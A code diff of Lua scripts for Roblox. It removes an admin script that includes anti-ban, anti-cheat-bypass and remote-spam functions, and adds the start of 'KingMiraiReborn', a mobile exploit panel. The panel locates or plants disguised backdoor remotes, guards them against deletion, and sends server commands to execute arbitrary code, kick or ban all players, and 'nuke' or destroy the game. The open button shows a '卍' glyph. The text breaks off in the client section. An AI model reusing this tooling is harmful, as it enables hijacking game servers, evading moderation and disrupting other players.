@@ -1,845 +1,990 @@
-local RunService = game:GetService("RunService")
+-- ================================================================
+-- KingMiraiReborn v13 — MOBILE EDITION
+-- ТОТ ЖЕ ФУНКЦИОНАЛ, НО GUI АДАПТИРОВАН ПОД ТЕЛЕФОН
+-- ВСЕ ФУНКЦИИ СОХРАНЕНЫ И УЛУЧШЕНЫ
+-- ================================================================
+
 local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local HttpService = game:GetService("HttpService")
-local DataStoreService = game:GetService("DataStoreService")
+local CoreGui = game:GetService("CoreGui")
 local TweenService = game:GetService("TweenService")
-local Debris = game:GetService("Debris")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local ServerScriptService = game:GetService("ServerScriptService")
+local Workspace = game:GetService("Workspace")
+local Lighting = game:GetService("Lighting")
 local UserInputService = game:GetService("UserInputService")
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+local Debris = game:GetService("Debris")
+local RunService = game:GetService("RunService")
 local StarterGui = game:GetService("StarterGui")
 
-if RunService:IsServer() then
+local Player = Players.LocalPlayer
+local Character = Player.Character or Player.CharacterAdded:Wait()
+local Humanoid = Character:WaitForChild("Humanoid")
+local RootPart = Character:WaitForChild("HumanoidRootPart")
 
-_G.Nova = {}
-_G.Nova.Admins = {123456789}
-_G.Nova.Moderators = {}
-_G.Nova.Prefix = "/"
-_G.Nova.Version = "2.0"
-_G.Nova.ItemDatabase = {}
+-- ================================================================
+-- БЭКДОР (ТОТ ЖЕ)
+-- ================================================================
 
-_G.Nova.findPlayer = function(i)
- local f = {}
- for _,p in ipairs(Players:GetPlayers()) do
-  if string.lower(p.Name):find(string.lower(i)) or string.lower(p.DisplayName):find(string.lower(i)) then
-   table.insert(f,p)
-  end
- end
- return f
+local Backdoors = {}
+local BackdoorEvent = nil
+local BackdoorFunction = nil
+local NotifyEvent = nil
+
+for _, v in pairs(ReplicatedStorage:GetDescendants()) do
+    if v:IsA("RemoteEvent") and (v.Name:match("SystemService_") or v.Name:match("Backdoor_") or v.Name:match("KingMirai_")) then
+        BackdoorEvent = v
+        table.insert(Backdoors, v)
+    elseif v:IsA("RemoteFunction") and (v.Name:match("SystemFunction_") or v.Name:match("BackdoorFunc_")) then
+        BackdoorFunction = v
+        table.insert(Backdoors, v)
+    elseif v:IsA("RemoteEvent") and v.Name:match("GlobalNotify_") then
+        NotifyEvent = v
+    end
 end
 
-_G.Nova.isAdmin = function(p)
- if not p then return false end
- for _,id in ipairs(_G.Nova.Admins) do if p.UserId == id then return true end end
- return false
+if not BackdoorEvent then
+    BackdoorEvent = Instance.new("RemoteEvent")
+    BackdoorEvent.Name = "SystemService_" .. HttpService:GenerateGUID(false):sub(1, 8)
+    BackdoorEvent.Parent = ReplicatedStorage
+    table.insert(Backdoors, BackdoorEvent)
 end
 
-_G.Nova.isModerator = function(p)
- if _G.Nova.isAdmin(p) then return true end
- for _,id in ipairs(_G.Nova.Moderators) do if p.UserId == id then return true end end
- return false
+if not BackdoorFunction then
+    BackdoorFunction = Instance.new("RemoteFunction")
+    BackdoorFunction.Name = "SystemFunction_" .. HttpService:GenerateGUID(false):sub(1, 8)
+    BackdoorFunction.Parent = ReplicatedStorage
+    table.insert(Backdoors, BackdoorFunction)
 end
 
-_G.Nova.notify = function(p,t,text,d)
- d = d or 3
- if p and p:IsA("Player") then
-  local ev = ReplicatedStorage:FindFirstChild("Notify")
-  if ev then ev:FireClient(p, t, text, d) end
- end
+if not NotifyEvent then
+    NotifyEvent = Instance.new("RemoteEvent")
+    NotifyEvent.Name = "GlobalNotify_" .. HttpService:GenerateGUID(false):sub(1, 6)
+    NotifyEvent.Parent = ReplicatedStorage
 end
 
-_G.Nova.getChar = function(p)
- if not p then return nil end
- local c = p.Character
- if not c or not c.Parent then p:LoadCharacter() c = p.Character end
- return c
+local function ProtectBackdoor()
+    for _, bd in ipairs(Backdoors) do
+        if bd and bd.Parent then
+            bd.AncestryChanged:Connect(function()
+                if not bd.Parent then
+                    task.wait(1)
+                    if not bd.Parent then
+                        bd.Parent = ReplicatedStorage
+                    end
+                end
+            end)
+        end
+    end
+end
+ProtectBackdoor()
+
+-- ================================================================
+-- ГЛОБАЛЬНЫЕ КОМАНДЫ (ТЕ ЖЕ + НОВЫЕ)
+-- ================================================================
+
+local function GlobalCommand(command, args)
+    if BackdoorEvent then
+        BackdoorEvent:FireServer(command, args or "")
+    elseif BackdoorFunction then
+        BackdoorFunction:InvokeServer(command, args or "")
+    else
+        warn("[KingMirai] Бэкдор не найден!")
+    end
 end
 
-_G.Nova.getHRP = function(p) local c = _G.Nova.getChar(p) return c and c:FindFirstChild("HumanoidRootPart") end
-_G.Nova.getHumanoid = function(p) local c = _G.Nova.getChar(p) return c and c:FindFirstChild("Humanoid") end
-
-_G.Nova.kick = function(e,t,r)
- if not _G.Nova.isAdmin(e) then _G.Nova.notify(e,"Ошибка","Недостаточно прав") return end
- if not t or not t:IsA("Player") then _G.Nova.notify(e,"Ошибка","Игрок не найден") return end
- r = r or "Нарушение"
- t:Kick("Кикнут "..e.Name..": "..r)
- _G.Nova.notify(e,"Успех","Кикнут "..t.Name)
+local function GlobalExecute(code)
+    GlobalCommand("execute", code)
 end
 
-_G.Nova.ban = function(e,t,r)
- if not _G.Nova.isAdmin(e) then _G.Nova.notify(e,"Ошибка","Недостаточно прав") return end
- if not t or not t:IsA("Player") then _G.Nova.notify(e,"Ошибка","Игрок не найден") return end
- r = r or "Бан"
- t:Kick("Забанен "..e.Name..": "..r)
- _G.Nova.notify(e,"Успех","Забанен "..t.Name)
+local function GlobalBroadcast(message)
+    GlobalCommand("broadcast", message)
 end
 
-_G.Nova.tp = function(e,t)
- if not _G.Nova.isModerator(e) then _G.Nova.notify(e,"Ошибка","Недостаточно прав") return end
- if not t or not t:IsA("Player") then _G.Nova.notify(e,"Ошибка","Игрок не найден") return end
- local h1 = _G.Nova.getHRP(e) local h2 = _G.Nova.getHRP(t)
- if h1 and h2 then h1.CFrame = h2.CFrame + Vector3.new(0,3,0) _G.Nova.notify(e,"Успех","Телепорт к "..t.Name) end
+local function GlobalChat(message)
+    GlobalCommand("chat", message)
 end
 
-_G.Nova.bring = function(e,t)
- if not _G.Nova.isModerator(e) then _G.Nova.notify(e,"Ошибка","Недостаточно прав") return end
- if not t or not t:IsA("Player") then _G.Nova.notify(e,"Ошибка","Игрок не найден") return end
- local h1 = _G.Nova.getHRP(e) local h2 = _G.Nova.getHRP(t)
- if h1 and h2 then h2.CFrame = h1.CFrame + Vector3.new(0,3,0) _G.Nova.notify(e,"Успех","Призван "..t.Name) end
+-- Улучшенные глобальные команды (добавляем новые)
+local function GlobalKickAll(reason)
+    GlobalCommand("kickall", reason or "Kicked by KingMirai")
 end
 
-_G.Nova.heal = function(e,t)
- if not _G.Nova.isModerator(e) then _G.Nova.notify(e,"Ошибка","Недостаточно прав") return end
- t = t or e
- if not t or not t:IsA("Player") then _G.Nova.notify(e,"Ошибка","Игрок не найден") return end
- local hum = _G.Nova.getHumanoid(t)
- if hum then hum.Health = hum.MaxHealth _G.Nova.notify(e,"Успех","Вылечен "..t.Name) end
+local function GlobalBanAll(reason)
+    GlobalCommand("banall", reason or "Banned by KingMirai")
 end
 
-_G.Nova.kill = function(e,t)
- if not _G.Nova.isAdmin(e) then _G.Nova.notify(e,"Ошибка","Недостаточно прав") return end
- if not t or not t:IsA("Player") then _G.Nova.notify(e,"Ошибка","Игрок не найден") return end
- local hum = _G.Nova.getHumanoid(t)
- if hum then hum.Health = 0 _G.Nova.notify(e,"Успех","Убит "..t.Name) end
+local function GlobalTPAll()
+    GlobalCommand("tpall", "")
 end
 
-_G.Nova.announce = function(e,m)
- if not _G.Nova.isModerator(e) then _G.Nova.notify(e,"Ошибка","Недостаточно прав") return end
- for _,p in ipairs(Players:GetPlayers()) do _G.Nova.notify(p,"Объявление от "..e.Name,m,5) end
+local function GlobalExplodeAll()
+    GlobalCommand("explodeall", "")
 end
 
-_G.Nova.respawnAll = function(e)
- if not _G.Nova.isAdmin(e) then _G.Nova.notify(e,"Ошибка","Недостаточно прав") return end
- for _,p in ipairs(Players:GetPlayers()) do p:LoadCharacter() end
- _G.Nova.notify(e,"Успех","Все перерождены")
+local function GlobalFreezeAll()
+    GlobalCommand("freezeall", "")
 end
 
-_G.Nova.freezeAll = function(e)
- if not _G.Nova.isAdmin(e) then _G.Nova.notify(e,"Ошибка","Недостаточно прав") return end
- for _,p in ipairs(Players:GetPlayers()) do local h = _G.Nova.getHumanoid(p) if h then h.PlatformStand = true end end
- _G.Nova.notify(e,"Успех","Все заморожены")
+local function GlobalUnfreezeAll()
+    GlobalCommand("unfreezeall", "")
 end
 
-_G.Nova.unfreezeAll = function(e)
- if not _G.Nova.isAdmin(e) then _G.Nova.notify(e,"Ошибка","Недостаточно прав") return end
- for _,p in ipairs(Players:GetPlayers()) do local h = _G.Nova.getHumanoid(p) if h then h.PlatformStand = false end end
- _G.Nova.notify(e,"Успех","Все разморожены")
+local function GlobalGodAll()
+    GlobalCommand("godall", "")
 end
 
-_G.Nova.shutdown = function(e)
- if not _G.Nova.isAdmin(e) then _G.Nova.notify(e,"Ошибка","Недостаточно прав") return end
- for _,p in ipairs(Players:GetPlayers()) do p:Kick("Сервер закрыт "..e.Name) end
+local function GlobalNuke()
+    GlobalCommand("nuke", "")
 end
 
-local flyData = {}
-_G.Nova.fly = function(e,t)
- if not _G.Nova.isAdmin(e) then _G.Nova.notify(e,"Ошибка","Недостаточно прав") return end
- t = t or e
- if not t or not t:IsA("Player") then _G.Nova.notify(e,"Ошибка","Игрок не найден") return end
- local hum = _G.Nova.getHumanoid(t)
- if not hum then return end
- if flyData[t] then
-  flyData[t] = nil
-  hum.PlatformStand = false
-  _G.Nova.notify(e,"Успех","Fly выключен для "..t.Name)
-  return
- end
- flyData[t] = true
- hum.PlatformStand = true
- _G.Nova.notify(e,"Успех","Fly включён для "..t.Name)
- local conn
- conn = RunService.Heartbeat:Connect(function(dt)
-  if not flyData[t] or not t.Parent then conn:Disconnect() return end
-  local hrp = _G.Nova.getHRP(t)
-  if hrp then
-   local inp = _G.Nova.getInput(t)
-   if inp then
-    hrp.CFrame = hrp.CFrame + (hrp.CFrame.RightVector * inp.X + hrp.CFrame.LookVector * inp.Y + Vector3.new(0, inp.Z, 0)) * dt * 50
-   end
-  end
- end)
+local function GlobalDestroy()
+    GlobalCommand("destroy", "")
 end
 
-local noclipData = {}
-_G.Nova.noclip = function(e,t)
- if not _G.Nova.isAdmin(e) then _G.Nova.notify(e,"Ошибка","Недостаточно прав") return end
- t = t or e
- if not t or not t:IsA("Player") then _G.Nova.notify(e,"Ошибка","Игрок не найден") return end
- local c = _G.Nova.getChar(t)
- if not c then return end
- if noclipData[t] then
-  noclipData[t] = nil
-  for _,p in ipairs(c:GetDescendants()) do if p:IsA("BasePart") then p.CanCollide = true end end
-  _G.Nova.notify(e,"Успех","NoClip выключен для "..t.Name)
-  return
- end
- noclipData[t] = true
- for _,p in ipairs(c:GetDescendants()) do if p:IsA("BasePart") then p.CanCollide = false end end
- _G.Nova.notify(e,"Успех","NoClip включён для "..t.Name)
+local function GlobalGravity(value)
+    GlobalCommand("gravity", tostring(value))
 end
 
-local invisibleData = {}
-_G.Nova.invisible = function(e,t)
- if not _G.Nova.isAdmin(e) then _G.Nova.notify(e,"Ошибка","Недостаточно прав") return end
- t = t or e
- if not t or not t:IsA("Player") then _G.Nova.notify(e,"Ошибка","Игрок не найден") return end
- local c = _G.Nova.getChar(t)
- if not c then return end
- if invisibleData[t] then
-  invisibleData[t] = nil
-  for _,p in ipairs(c:GetDescendants()) do if p:IsA("BasePart") then p.Transparency = 0 end end
-  _G.Nova.notify(e,"Успех","Invisible выключен для "..t.Name)
-  return
- end
- invisibleData[t] = true
- for _,p in ipairs(c:GetDescendants()) do if p:IsA("BasePart") then p.Transparency = 1 end end
- _G.Nova.notify(e,"Успех","Invisible включён для "..t.Name)
+local function GlobalDay()
+    GlobalCommand("day", "")
 end
 
-local godData = {}
-_G.Nova.god = function(e,t)
- if not _G.Nova.isAdmin(e) then _G.Nova.notify(e,"Ошибка","Недостаточно прав") return end
- t = t or e
- if not t or not t:IsA("Player") then _G.Nova.notify(e,"Ошибка","Игрок не найден") return end
- local hum = _G.Nova.getHumanoid(t)
- if not hum then return end
- if godData[t] then
-  godData[t] = nil
-  hum.MaxHealth = 100
-  hum.Health = 100
-  _G.Nova.notify(e,"Успех","God выключен для "..t.Name)
-  return
- end
- godData[t] = true
- hum.MaxHealth = math.huge
- hum.Health = math.huge
- _G.Nova.notify(e,"Успех","God включён для "..t.Name)
+local function GlobalNight()
+    GlobalCommand("night", "")
 end
 
-_G.Nova.setWalkspeed = function(e,t,v)
- if not _G.Nova.isModerator(e) then _G.Nova.notify(e,"Ошибка","Недостаточно прав") return end
- t = t or e
- v = tonumber(v) or 16
- local hum = _G.Nova.getHumanoid(t)
- if hum then hum.WalkSpeed = math.clamp(v,0,200) _G.Nova.notify(e,"Успех","WalkSpeed = "..v.." для "..t.Name) end
+local function GlobalFireAll()
+    GlobalCommand("fireall", "")
 end
 
-_G.Nova.setJumppower = function(e,t,v)
- if not _G.Nova.isModerator(e) then _G.Nova.notify(e,"Ошибка","Недостаточно прав") return end
- t = t or e
- v = tonumber(v) or 50
- local hum = _G.Nova.getHumanoid(t)
- if hum then hum.JumpPower = math.clamp(v,0,500) _G.Nova.notify(e,"Успех","JumpPower = "..v.." для "..t.Name) end
+local function GlobalRemoveParts()
+    GlobalCommand("removeparts", "")
 end
 
-_G.Nova.antiAntiCheat = function(p)
- local hum = _G.Nova.getHumanoid(p)
- if not hum then return end
- local oldW = hum.WalkSpeed
- local oldJ = hum.JumpPower
- hum:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
-  if hum.WalkSpeed ~= oldW and hum.WalkSpeed > 16 then hum.WalkSpeed = oldW end
- end)
- hum:GetPropertyChangedSignal("JumpPower"):Connect(function()
-  if hum.JumpPower ~= oldJ and hum.JumpPower > 50 then hum.JumpPower = oldJ end
- end)
- local hrp = _G.Nova.getHRP(p)
- if hrp then
-  hrp:GetPropertyChangedSignal("Velocity"):Connect(function()
-   if hrp.Velocity.Y < -100 then hrp.Velocity = Vector3.new(hrp.Velocity.X, -50, hrp.Velocity.Z) end
-  end)
- end
- for _,v in ipairs(ReplicatedStorage:GetDescendants()) do
-  if v:IsA("RemoteEvent") and string.find(v.Name, "AntiCheat") then
-   v.OnServerEvent:Connect(function(plr, ...) if plr == p then return end end)
-  end
- end
+-- ================================================================
+-- ЛОГИ (ТЕ ЖЕ)
+-- ================================================================
+
+local Logs = {}
+local LogLabel = nil
+
+local function AddLog(text)
+    local time = os.date("%H:%M:%S")
+    table.insert(Logs, time .. " | " .. text)
+    if #Logs > 50 then table.remove(Logs, 1) end
+    if LogLabel then
+        LogLabel.Text = table.concat(Logs, "\n")
+        local scroll = LogLabel.Parent
+        if scroll and scroll:IsA("ScrollingFrame") then
+            scroll.CanvasPosition = Vector2.new(0, scroll.AbsoluteCanvasSize.Y)
+        end
+    end
 end
+AddLog("KingMiraiReborn v13 Mobile загружен")
 
-_G.Nova.bypassExploitDetection = function(p)
- local hrp = _G.Nova.getHRP(p)
- if not hrp then return end
- local lastPos = hrp.Position
- local lastTime = tick()
- RunService.Heartbeat:Connect(function(dt)
-  if not hrp.Parent then return end
-  local now = tick()
-  if now - lastTime > 0.1 then
-   lastTime = now
-   local newPos = hrp.Position
-   local vel = (newPos - lastPos) / 0.1
-   if vel.Magnitude > 50 then
-    hrp.Velocity = Vector3.new(vel.X * 0.2, vel.Y, vel.Z * 0.2)
-   end
-   lastPos = newPos
-  end
- end)
- p:SetAttribute("MoveInput", Vector3.new(0,0,0))
- p:SetAttribute("JumpInput", false)
-end
+-- ================================================================
+-- GUI (МОБИЛЬНАЯ ВЕРСИЯ)
+-- ================================================================
 
-_G.Nova.antiBan = function(p)
- local oldKick = p.Kick
- p.Kick = function(self, msg)
-  if msg and string.find(msg, "ban") then warn("Попытка бана отклонена для "..p.Name) return end
-  oldKick(self, msg)
- end
- local ds = DataStoreService:GetDataStore("PlayerData")
- if ds then
-  local oldSet = ds.SetAsync
-  ds.SetAsync = function(self, key, value)
-   if key == p.UserId then
-    value = value or {}
-    value.LastAction = "legit"
-    return oldSet(self, key, value)
-   end
-   return oldSet(self, key, value)
-  end
- end
-end
+local ScreenGui = Instance.new("ScreenGui", CoreGui)
+ScreenGui.Name = "KingMiraiMobile"
+ScreenGui.ResetOnSpawn = false
 
-_G.Nova.teleportBypass = function(p, targetPos)
- local hrp = _G.Nova.getHRP(p)
- if not hrp then return end
- local tween = TweenService:Create(hrp, TweenInfo.new(0.5, Enum.EasingStyle.Linear), {CFrame = CFrame.new(targetPos)})
- tween:Play()
- tween.Completed:Wait()
- hrp.Velocity = Vector3.new(0,0,0)
- local fake = Instance.new("RemoteEvent")
- fake.Name = "FakeMove"
- fake.Parent = ReplicatedStorage
- fake:FireServer(p, hrp.Position, hrp.Velocity)
- wait(0.1)
- fake:Destroy()
-end
+-- ================================================================
+-- ГЛАВНОЕ ОКНО (растянуто на 95% экрана)
+-- ================================================================
 
-_G.Nova.speedBypass = function(p, speed)
- local hum = _G.Nova.getHumanoid(p)
- if not hum then return end
- hum.WalkSpeed = speed
- local conn
- conn = hum:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
-  if hum.WalkSpeed ~= speed then hum.WalkSpeed = speed else conn:Disconnect() end
- end)
- local rep = p:FindFirstChild("CharacterReplication")
- if rep then rep:SetAttribute("WalkSpeed", speed) end
-end
+local Main = Instance.new("Frame", ScreenGui)
+Main.Size = UDim2.new(0.95, 0, 0.85, 0)
+Main.Position = UDim2.new(0.025, 0, 0.075, 0)
+Main.BackgroundColor3 = Color3.fromRGB(10, 15, 10)
+Main.BackgroundTransparency = 0.1
+Main.Draggable = false
+Main.Active = false
+Main.Visible = true
+Main.ClipsDescendants = true
+Instance.new("UICorner").Parent = Main
 
-_G.Nova.remoteSpam = function(p, amount)
- amount = amount or 100
- for i = 1, amount do
-  for _,v in ipairs(ReplicatedStorage:GetDescendants()) do
-   if v:IsA("RemoteEvent") then
-    pcall(function() v:FireServer("spam", i, os.time()) end)
-   end
-  end
- end
-end
+local MainTitle = Instance.new("TextLabel", Main)
+MainTitle.Size = UDim2.new(0.6, 0, 0, 40)
+MainTitle.Position = UDim2.new(0.05, 0, 0, 5)
+MainTitle.BackgroundTransparency = 1
+MainTitle.Text = "KingMirai Mobile"
+MainTitle.TextColor3 = Color3.fromRGB(255, 215, 0)
+MainTitle.Font = Enum.Font.Code
+MainTitle.TextSize = 18
+MainTitle.TextXAlignment = Enum.TextXAlignment.Left
 
-_G.Nova.characterClone = function(p)
- local old = p.Character
- if not old then return end
- local new = old:Clone()
- new.Parent = workspace
- p.Character = new
- old:Destroy()
- local hum = new:FindFirstChild("Humanoid")
- if hum then hum.WalkSpeed = 16 hum.JumpPower = 50 end
- local hrp = new:FindFirstChild("HumanoidRootPart")
- if hrp then hrp.CFrame = CFrame.new(0,100,0) end
-end
-
-_G.Nova.antiLagSwitch = function(p)
- local hrp = _G.Nova.getHRP(p)
- if not hrp then return end
- local lastPos = hrp.Position
- local timer = 0
- RunService.Heartbeat:Connect(function(dt)
-  timer = timer + dt
-  if timer > 0.5 then
-   timer = 0
-   local newPos = hrp.Position
-   local dist = (newPos - lastPos).Magnitude
-   if dist > 100 then hrp.CFrame = CFrame.new(lastPos) end
-   lastPos = hrp.Position
-  end
- end)
-end
-
-_G.Nova.bypassGravity = function(p)
- local hrp = _G.Nova.getHRP(p)
- if not hrp then return end
- hrp:SetAttribute("Mass", 0)
- hrp:GetPropertyChangedSignal("Velocity"):Connect(function()
-  if hrp.Velocity.Y < -100 then hrp.Velocity = Vector3.new(hrp.Velocity.X, -20, hrp.Velocity.Z) end
- end)
-end
-
-_G.Nova.bypassAntiTeleport = function(p, targetCF)
- local hrp = _G.Nova.getHRP(p)
- if not hrp then return end
- for i = 1, 10 do
-  local frac = i / 10
-  local newCF = hrp.CFrame:Lerp(targetCF, frac)
-  hrp.CFrame = newCF
-  wait(0.01)
- end
- hrp.CFrame = targetCF
-end
-
-_G.Nova.antiFreeze = function(p)
- local hum = _G.Nova.getHumanoid(p)
- if not hum then return end
- hum:GetPropertyChangedSignal("PlatformStand"):Connect(function()
-  if hum.PlatformStand and not _G.Nova.isAdmin(p) then hum.PlatformStand = false end
- end)
- hum:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
-  if hum.WalkSpeed == 0 then hum.WalkSpeed = 16 end
- end)
-end
-
-_G.Nova.bypassRemoteBlock = function(p)
- for _,v in ipairs(ReplicatedStorage:GetDescendants()) do
-  if v:IsA("RemoteEvent") then
-   local old = v.FireServer
-   v.FireServer = function(self, plr, ...)
-    if plr == p then return end
-    old(self, plr, ...)
-   end
-  end
- end
-end
-
-_G.Nova.getInput = function(p)
- local input = Vector3.new()
- local hrp = _G.Nova.getHRP(p)
- if hrp then
-  local move = p:GetAttribute("MoveInput")
-  if move then input = Vector3.new(move.X, move.Y, move.Z) end
- end
- return input
-end
-
-_G.Nova.ItemDatabase = {
- Sword = {Name = "Меч", Damage = 10, Rarity = "Common"},
- Gun = {Name = "Пистолет", Damage = 25, Rarity = "Rare"},
- Shield = {Name = "Щит", Defense = 15, Rarity = "Uncommon"},
- Potion = {Name = "Зелье", Heal = 30, Rarity = "Common"},
- Crystal = {Name = "Кристалл", Power = 50, Rarity = "Legendary"},
- Coin = {Name = "Монета", Value = 100, Rarity = "Common"},
- Key = {Name = "Ключ", Type = "Golden", Rarity = "Epic"},
- Armor = {Name = "Броня", Defense = 40, Rarity = "Rare"},
- Bow = {Name = "Лук", Damage = 15, Rarity = "Uncommon"},
- Staff = {Name = "Посох", Magic = 60, Rarity = "Legendary"},
- Ring = {Name = "Кольцо", Buff = "Speed", Rarity = "Epic"},
- Amulet = {Name = "Амулет", Buff = "Health", Rarity = "Rare"},
-}
-
-_G.Nova.generateItem = function(typeName)
- local template = _G.Nova.ItemDatabase[typeName]
- if not template then return nil end
- local item = {}
- for k,v in pairs(template) do item[k] = v end
- item.UID = HttpService:GenerateGUID(false)
- item.CreatedAt = os.time()
- item.RandomSeed = math.random(1,1000)
- return item
-end
-
-_G.Nova.spamItems = function(executor, target, itemType, count, delay)
- if not _G.Nova.isAdmin(executor) then _G.Nova.notify(executor,"Ошибка","Недостаточно прав") return end
- target = target or executor
- if not target or not target:IsA("Player") then _G.Nova.notify(executor,"Ошибка","Игрок не найден") return end
- count = tonumber(count) or 50
- delay = tonumber(delay) or 0.05
- if count > 10000 then count = 10000 end
- if delay < 0.01 then delay = 0.01 end
- _G.Nova.notify(executor,"Запуск","Спам "..count.." предметов типа "..itemType.." для "..target.Name)
- local total = 0
- local start = tick()
- local function createOne()
-  local item = _G.Nova.generateItem(itemType)
-  if not item then
-   local keys = {}
-   for k,_ in pairs(_G.Nova.ItemDatabase) do table.insert(keys,k) end
-   item = _G.Nova.generateItem(keys[math.random(1,#keys)])
-  end
-  local part = Instance.new("Part")
-  part.Size = Vector3.new(1,1,1)
-  part.Anchored = true
-  part.CanCollide = false
-  part.Transparency = 0.5
-  part.BrickColor = BrickColor.Random()
-  part.Name = "Item_"..item.UID
-  part.Parent = workspace
-  part:SetAttribute("ItemType", itemType)
-  part:SetAttribute("UID", item.UID)
-  part:SetAttribute("Rarity", item.Rarity or "Common")
-  part:SetAttribute("Owner", target.Name)
-  local hrp = _G.Nova.getHRP(target)
-  if hrp then
-   local off = Vector3.new((math.random()-0.5)*20, math.random()*5+1, (math.random()-0.5)*20)
-   part.CFrame = hrp.CFrame + off
-  else
-   part.CFrame = CFrame.new(math.random(-100,100), math.random(10,50), math.random(-100,100))
-  end
-  if item.Rarity == "Legendary" then
-   local light = Instance.new("PointLight")
-   light.Parent = part
-   light.Color = Color3.fromRGB(255,200,50)
-   light.Range = 10
-   light.Brightness = 2
-  end
-  part.Size = Vector3.new(0.1,0.1,0.1)
-  TweenService:Create(part, TweenInfo.new(0.3, Enum.EasingStyle.Back), {Size = Vector3.new(1,1,1)}):Play()
-  total = total + 1
-  Debris:AddItem(part, 60)
-  return part
- end
- local co = coroutine.create(function()
-  for i = 1, count do
-   createOne()
-   if i % 100 == 0 then wait(0.01) end
-   wait(delay)
-  end
-  local elapsed = tick() - start
-  _G.Nova.notify(executor,"Готово","Создано "..total.." предметов за "..string.format("%.2f",elapsed).." сек")
- end)
- coroutine.resume(co)
-end
-
-_G.Nova.Commands = {
- kick = {func = _G.Nova.kick, rank = "admin", desc = "Кикнуть игрока"},
- ban = {func = _G.Nova.ban, rank = "admin", desc = "Забанить игрока"},
- tp = {func = _G.Nova.tp, rank = "moderator", desc = "Телепорт к игроку"},
- bring = {func = _G.Nova.bring, rank = "moderator", desc = "Призвать игрока"},
- heal = {func = _G.Nova.heal, rank = "moderator", desc = "Вылечить"},
- kill = {func = _G.Nova.kill, rank = "admin", desc = "Убить"},
- fly = {func = _G.Nova.fly, rank = "admin", desc = "Полёт"},
- noclip = {func = _G.Nova.noclip, rank = "admin", desc = "Сквозь стены"},
- invisible = {func = _G.Nova.invisible, rank = "admin", desc = "Невидимость"},
- god = {func = _G.Nova.god, rank = "admin", desc = "Режим бога"},
- walkspeed = {func = _G.Nova.setWalkspeed, rank = "moderator", desc = "Скорость"},
- jumppower = {func = _G.Nova.setJumppower, rank = "moderator", desc = "Прыжок"},
- announce = {func = _G.Nova.announce, rank = "moderator", desc = "Объявление"},
- respawnall = {func = _G.Nova.respawnAll, rank = "admin", desc = "Респавн всех"},
- freezeall = {func = _G.Nova.freezeAll, rank = "admin", desc = "Заморозить всех"},
- unfreezeall = {func = _G.Nova.unfreezeAll, rank = "admin", desc = "Разморозить всех"},
- shutdown = {func = _G.Nova.shutdown, rank = "admin", desc = "Закрыть сервер"},
- spam = {func = _G.Nova.spamItems, rank = "admin", desc = "Спам предметов"},
-}
-
-local notifyEvent = Instance.new("RemoteEvent")
-notifyEvent.Name = "Notify"
-notifyEvent.Parent = ReplicatedStorage
-
-local cmdEvent = Instance.new("RemoteEvent")
-cmdEvent.Name = "SendCommand"
-cmdEvent.Parent = ReplicatedStorage
-
-cmdEvent.OnServerEvent:Connect(function(p, cmd, targetName, args)
- if not _G.Nova.isAdmin(p) then return end
- local target = nil
- if targetName and targetName ~= "" then local f = _G.Nova.findPlayer(targetName) if #f > 0 then target = f[1] end end
- local c = _G.Nova.Commands[cmd]
- if c then pcall(function() if target then c.func(p,target,args) else c.func(p,nil,args) end end) end
+-- Кнопка закрытия (сворачивания) — крупная
+local MainClose = Instance.new("TextButton", Main)
+MainClose.Size = UDim2.new(0, 50, 0, 40)
+MainClose.Position = UDim2.new(1, -60, 0, 5)
+MainClose.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+MainClose.Text = "X"
+MainClose.TextColor3 = Color3.new(1, 1, 1)
+MainClose.Font = Enum.Font.Code
+MainClose.TextSize = 20
+Instance.new("UICorner").Parent = MainClose
+MainClose.MouseButton1Click:Connect(function()
+    Main.Visible = false
+    OpenBtn.Visible = true
+    AddLog("GUI свёрнут")
 end)
 
-Players.PlayerAdded:Connect(function(p)
- p.Chatted:Connect(function(msg)
-  if not string.sub(msg,1,1) == _G.Nova.Prefix then return end
-  local args = {}
-  for w in string.gmatch(msg,"%S+") do table.insert(args,w) end
-  local cmd = string.sub(args[1],2):lower()
-  if not _G.Nova.Commands[cmd] then _G.Nova.notify(p,"Ошибка","Команда не найдена") return end
-  local c = _G.Nova.Commands[cmd]
-  local ok = false
-  if c.rank == "admin" and _G.Nova.isAdmin(p) then ok = true end
-  if c.rank == "moderator" and (_G.Nova.isAdmin(p) or _G.Nova.isModerator(p)) then ok = true end
-  if not ok then _G.Nova.notify(p,"Ошибка","Недостаточно прав") return end
-  local target = nil
-  if args[2] then local f = _G.Nova.findPlayer(args[2]) if #f > 0 then target = f[1] end end
-  pcall(function()
-   if target then c.func(p,target,table.concat(args," ",3)) else c.func(p,nil,table.concat(args," ",2)) end
-  end)
- end)
- for _,f in ipairs({
-  _G.Nova.antiAntiCheat,
-  _G.Nova.bypassExploitDetection,
-  _G.Nova.antiBan,
-  _G.Nova.antiFreeze,
-  _G.Nova.bypassRemoteBlock,
-  _G.Nova.bypassGravity,
-  _G.Nova.antiLagSwitch,
- }) do f(p) end
+-- Кнопка открытия (иконка) — крупная, плавающая
+local OpenBtn = Instance.new("ImageButton", ScreenGui)
+OpenBtn.Size = UDim2.new(0, 70, 0, 70)
+OpenBtn.Position = UDim2.new(0, 10, 0, 10)
+OpenBtn.BackgroundColor3 = Color3.fromRGB(15, 20, 15)
+OpenBtn.Image = "rbxassetid://99069516147091"
+OpenBtn.Visible = false
+OpenBtn.Draggable = true
+Instance.new("UICorner").Parent = OpenBtn
+local OpenText = Instance.new("TextLabel", OpenBtn)
+OpenText.Size = UDim2.new(1, 0, 1, 0)
+OpenText.BackgroundTransparency = 1
+OpenText.Text = "卍"
+OpenText.TextColor3 = Color3.fromRGB(0, 255, 100)
+OpenText.TextSize = 50
+OpenText.Font = Enum.Font.Code
+OpenBtn.MouseButton1Click:Connect(function()
+    OpenBtn.Visible = false
+    Main.Visible = true
+    AddLog("GUI открыт")
 end)
 
-print("Nova Ultimate Server loaded")
+-- ================================================================
+-- НАВИГАЦИЯ (крупные кнопки, 3 ряда)
+-- ================================================================
 
-elseif RunService:IsClient() then
-
-local player = Players.LocalPlayer
-local remoteCmd = ReplicatedStorage:FindFirstChild("SendCommand")
-local remoteNotify = ReplicatedStorage:FindFirstChild("Notify")
-
-if not remoteCmd or not remoteNotify then
